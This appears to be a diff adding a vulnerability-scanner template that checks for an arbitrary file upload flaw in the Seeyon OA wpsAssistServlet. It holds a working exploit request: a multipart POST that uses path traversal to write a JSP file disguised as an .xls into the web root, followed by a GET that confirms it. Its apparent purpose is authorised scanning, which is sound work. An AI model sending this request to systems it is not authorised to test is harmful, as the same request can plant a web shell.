@@ -1,0 +1,57 @@
+id: seeyon-oa-sp2-file-upload
+brief:
+    title: Seeyon OA wpsAssistServlet - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and ...
+    label:
+        - seeyon
+        - oa
+        - file-upload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+      body: |-
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="upload"; filename="{{filename}}.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("{{string}}");%>
+        --59229605f98b8cf290a7b8908b34616b--
+      signs:
+        - "on": word
+          has:
+            - '"success":'
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{{string}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{filename}}.jsp'
+      signs:
+        - "on": word
+          has:
+            - '"success":'
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{{string}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
